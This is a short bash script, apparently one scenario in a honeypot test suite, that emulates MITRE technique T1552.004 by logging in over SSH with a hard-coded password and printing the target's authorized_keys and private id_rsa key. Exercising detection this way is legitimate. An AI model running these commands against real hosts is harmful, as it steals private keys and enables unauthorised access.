#!/usr/bin/env bash
# S10 — SSH Key Enumeration
# Tactic : Credential Access (TA0006)
# Technique: T1552.004 Unsecured Credentials: Private Keys
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S10 SSH Key Enumeration — ${TARGET} ==="
$SSH "ls -la ~/.ssh; cat ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null" && echo "[OK]" || echo "[FAIL]"
